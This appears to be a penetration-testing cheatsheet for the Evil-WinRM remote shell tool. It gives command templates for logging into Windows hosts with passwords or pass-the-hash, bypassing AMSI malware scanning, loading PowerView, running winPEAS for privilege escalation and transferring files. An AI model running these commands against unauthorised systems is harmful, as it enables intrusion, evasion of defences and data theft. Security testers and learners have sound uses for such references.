# Evil-WinRM Cheatsheet
### Login using Plain text password

```
evil-winrm -i <ip_address> -u <username> -p <password>
```

### Login using Hash

```
evil-winrm -i <ip_address> -u <username> -H <Hash_Value>
```
### Login using Plain text password by enabling SSL

```
evil-winrm -i <ip_address> -u <username> -p <password> -S
```

### Loading a Powershell Script
```
evil-winrm -i <ip_address> -u <username> -p <password> -s <path_of_script>
```
Firstly we bypass the AMSI and type the script name. Then type menu and check the loaded functions.
- Bypass-4MSI
- PowerView.ps1 (the script name)
- menu

### Storing Logs with evil-winrm
To save session log all you have to do is just add the -l option so it will save logs to the base machine in the /root/evil-winrm-logs directory.
```
evil-winrm -i <ip_address> -u <username> -p <password> -l
```

### Running Executable files using Evil-winrm
```
evil-winrm -i <ip_address> -u <username> -p <password> -e <path_of_executable>
```
Before running the executable make sure you have bypassed the AMSI.
- Bypass-4MSI
- menu

Then Execute Binary
```
Invoke-Binary <the path and exe file name>
Invoke-Binary /opt/privsc/winPEASx64.exe
```
### File Transfer using evil-winrm
use download command to download any file
```
download sample.txt /home/ruth/sample.txt
```
use upload command to upload any file
```
upload /root/root.txt 
```
